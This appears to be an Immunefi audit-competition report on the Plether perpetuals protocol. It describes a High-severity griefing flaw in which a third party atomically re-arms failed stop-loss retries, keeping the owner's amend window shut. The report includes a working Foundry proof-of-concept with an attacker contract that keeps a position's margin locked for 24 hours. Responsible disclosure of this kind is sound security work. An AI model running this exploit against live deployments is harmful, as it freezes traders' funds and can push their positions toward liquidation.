# \#100016 [SC-High] Anyone can bundle failed protection attempt + retry to keep the owner's MED-9 amend window shut, locking a position 24h+

**Submitted on Nov 16th 2026 at 03:55:30 UTC by @SeerBear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100016
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description


## Brief / Intro

After a stop-loss / take-profit triggers, the trader cannot cancel it or close the position normally. The protocol's only owner lever is `amendLatchedPositionProtectionCloseLimits`. This is the fix Cecuro added for MED-9, so the owner can relax close ceilings that keep failing. It works only while the protection is `Latched`. Any caller can terminalize the failing attempt and call the permissionless `retryPositionProtectionClose` in one transaction. The protection then goes `Triggered -> Latched -> Triggered` inside that transaction and is never `Latched` between transactions. The owner's amend, cancel and ordinary close all revert, and the position and its margin stay locked. During the weekly FX closure (oracle-frozen regime, about 47 h), each renewal needs no Pyth update and pays no Pyth fee.

## Vulnerability Details (packages/perps/src @ a82d4fef)

1. `PositionProtectionBook.retryPositionProtectionClose` (PositionProtectionBook.sol:382-405) has no caller check. It requires `status == Latched` (386) and no pending order (392), then queues a new attempt. `_recordCloseAttempt` (564) sets `Triggered` (573).
2. A failing attempt is terminalized by `Router.executeOrder`. `handleFailedProtectionAttempt` (PositionProtectionBook.sol:637) sets `Latched` (666) in the same call. Both entrypoints are external with separate `nonReentrant` guards, so a contract can call them back to back.
3. The retry copies the stored ceilings unchanged (`_protectionCloseRequest`, router/OrderLiquidationBatchLogic.sol:663-684), so it fails again on the same constraint.
4. Owner exits:
   - `amendLatchedPositionProtectionCloseLimits` (PositionProtectionBook.sol:315) reverts `ProtectionNotLatched` (320-321).
   - `_cancel` (408-420) allows only PendingOpen/Armed.
   - `commitOrder` reverts `ProtectionActive` (OrderLiquidationBatchLogic.sol:313-314).
5. Frozen regime:
   - `PletherOracle.getOrderExecutionFee` returns 0 (PletherOracle.sol:496-500).
   - `_resolveOrderExecutionBasket` replays the cached engine mark without update data (586-593). `fadMaxStaleness` is 3 days (CfdEngine.sol:140).
   - The SameBlock / MevBoundary checks are skipped (OrderRouterExecutionSidecar.sol:447-450).
   - Each renewal therefore costs only gas (about 1.15M per bundle).

## Why this is not a known issue

- **Cecuro MED-9 (Acknowledged).** The fix note says: "Only the owner may amend the retained ceilings while protection is Latched ... Tight limits may prevent execution until conditions improve or the owner amends them." The atomic bundle removes the `Latched` window that this fix relies on, so the fix is incomplete at a82d4fef.
- **SECURITY.md:1356-1359.** Asks operators to "alert on prolonged `Latched` state without a live child". This note is about keepers being slow. Under the bundle the state is always `Triggered` with a live child, so that alert never fires. CANONICAL_ENTRYPOINTS.md:281-284 also describes the retry as a *separate* transaction.
- **Public AI scan Low ("Triggered or Latched protection cannot be cancelled").** Root cause: keepers are not paid to act after the trigger, a liveness gap. Our root cause is a third party actively suppressing the owner's amend path, which works even when keepers are diligent.
- **PositionProtection.t.sol:991-997.** Checks that one third-party retry closes the window. It does not cover the repeated atomic bundle, which keeps the window closed indefinitely.

## Impact Details

The PoC freezes 1,986 USDG of position margin for 24 h of a 10,000 USDG position. The trader's free settlement is 17,999.8 of a 19,995.8 balance, and a full withdraw reverts. Renewals: 1,440. Pyth fee paid: 0 wei (a live-mode renewal paid 2e9 wei under the same mock fee). The attacker earns nothing. Their cost is gas, about 1.66B over 24 h; at an assumed 0.01 gwei on Arbitrum that is about 0.017 ETH. The locked amount scales with the position. Once the weekend ends, the lock continues for one Pyth fee per renewal. If the price keeps moving against the trader, the end state is liquidation: the existing PoC measures 391.36 USDG below the owner-amend control.

Honest caveats:
- An owner who terminalizes the live attempt and amends in the same transaction (contract wallet or EIP-7702 batch) escapes. So does an EOA whose amend lands before the attacker's retry. `test_Counter_OwnerWhoTerminalizesFirstCanAmend` shows this. The protocol gives no such path; the documented flow is a single amend call that always reverts here.
- The lock needs a trigger whose close fails the trader's ceiling (a price gap). The attacker must land each renewal before any honest keeper terminalizes the attempt.
- If the price comes back under the ceiling, the stored close fills.

## References

- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L405
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L676
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L663-L684
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L496-L506
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L447-L450
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1356-L1359

## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

interface IRouterExecute {
    function executeOrder(uint64 orderId, bytes[] calldata data) external payable returns (OrderV3Types.ExecutionResult memory);
}

/// Any third party: executes the live child and re-arms the retry in one transaction.
contract Attacker {
    IRouterExecute immutable ROUTER;
    IPositionProtectionActions immutable BOOK;

    constructor(address router_, address book_) {
        ROUTER = IRouterExecute(router_);
        BOOK = IPositionProtectionActions(book_);
    }

    function renew(uint64 childId, uint64 protectionId) external returns (uint64) {
        ROUTER.executeOrder(childId, new bytes[](0));
        return BOOK.retryPositionProtectionClose(protectionId);
    }
}

contract PoC_N001_Short is BasePerpTest {
    IPositionProtectionActions book;
    address constant ALICE = address(0xA11CE);
    address constant KEEPER = address(0xE0EC);
    uint256 constant SIZE = 10_000e18;
    uint256 constant GAP_PRICE = 116_000_000; // 1.16, gapped past the 1.10 stop
    uint256 constant FROZEN_START = 1_709_933_400 + 30 minutes; // Fri 2024-03-08 22:00 UTC, FX close

    function setUp() public override {
        super.setUp();
        book = IPositionProtectionActions(address(router.positionProtectionBook()));
        _fundTrader(ALICE, 20_000e6);
        vm.warp(FROZEN_START - 3 hours - 30 minutes);
        router.updateMarkPrice(_priceData(1e8));
    }

    function test_ThirdPartyKeepsPositionLocked24h() public {
        (uint64 protectionId, uint64 child) = _openTriggeredStop();
        (, uint256 marginStart,,,,,) = engine.positions(ALICE);
        Attacker attacker = new Attacker(address(router), address(book));
        baseMockPyth.setFee(1e9); // live updates would cost the keeper; frozen ones must not
        uint256 pythBefore = address(baseMockPyth).balance;

        uint256 cap = engine.CAP_PRICE();
        uint256 start = vm.getBlockTimestamp();
        uint256 renewals;
        while (vm.getBlockTimestamp() < start + 24 hours) {
            vm.warp(vm.getBlockTimestamp() + 60);
            vm.roll(vm.getBlockNumber() + 1);
            child = attacker.renew(child, protectionId);
            ++renewals;

            vm.startPrank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            book.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimited());
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            book.cancelPositionProtection(protectionId);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
            router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, cap, true);
            vm.stopPrank();
        }
        assertTrue(engine.isOracleFrozen(), "still the same frozen weekend");

        (uint256 size, uint256 marginEnd,,,,,) = engine.positions(ALICE);
        uint256 pythPaid = address(baseMockPyth).balance - pythBefore;
        assertEq(size, SIZE, "position still open");
        assertEq(marginEnd, marginStart, "margin unchanged");
        assertEq(pythPaid, 0, "0 wei to Pyth");
        uint256 balance = clearinghouse.balanceAssets(ALICE);
        vm.prank(ALICE);
        vm.expectRevert();
        clearinghouse.withdraw(ALICE, balance);

        emit log_named_uint("lock duration (s)", vm.getBlockTimestamp() - start);
        emit log_named_uint("renewals", renewals);
        emit log_named_uint("position margin start (USDG 6dp)", marginStart);
        emit log_named_uint("position margin end (USDG 6dp)", marginEnd);
        emit log_named_uint("Pyth fee paid by attacker (wei)", pythPaid);
    }

    function test_Control_OwnerAmendsAndCloses() public {
        (uint64 protectionId, uint64 child) = _openTriggeredStop();

        vm.prank(KEEPER);
        IRouterExecute(address(router)).executeOrder(child, new bytes[](0));
        vm.prank(ALICE);
        book.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimited());
        vm.prank(KEEPER);
        uint64 retryId = book.retryPositionProtectionClose(protectionId);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = IRouterExecute(address(router)).executeOrder(retryId, new bytes[](0));

        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended close executes");
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0, "position closed");
        emit log_named_uint("control: position size after owner amend (0 = closed)", size);
    }

    // Long 10k at 1.00, stop 1.10 with a 11,500 USDG notional ceiling; price gaps to 1.16 and the stop
    // triggers; then the FX market closes and the oracle freezes at 1.16, so every close fails the ceiling.
    function _openTriggeredStop() internal returns (uint64 protectionId, uint64 child) {
        _open(ALICE, CfdTypes.Side.LONG, SIZE, 2000e6, 1e8);
        PositionProtectionTypes.PositionProtectionParams memory p;
        p.stopLossTriggerPrice = 110_000_000;
        p.closeLimits = _unlimited();
        p.closeLimits.maxExecutionNotionalAssets = 11_500e6;
        vm.prank(ALICE);
        protectionId = book.createPositionProtection(p);

        _mockPythUpdateData(GAP_PRICE);
        child = book.triggerPositionProtection(protectionId, _priceData(GAP_PRICE));

        vm.warp(FROZEN_START + 1 hours);
        vm.roll(vm.getBlockNumber() + 1);
        assertTrue(engine.isOracleFrozen(), "weekend frozen regime");
        assertEq(engine.lastMarkPrice(), GAP_PRICE);
    }

    function _unlimited() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory) {
        return PositionProtectionTypes.CloseFinancialLimits(type(uint256).max, type(uint256).max, type(uint256).max, type(uint256).max);
    }

    function _priceData(uint256 price) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, engine.lastMarkTime())
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }
}
```
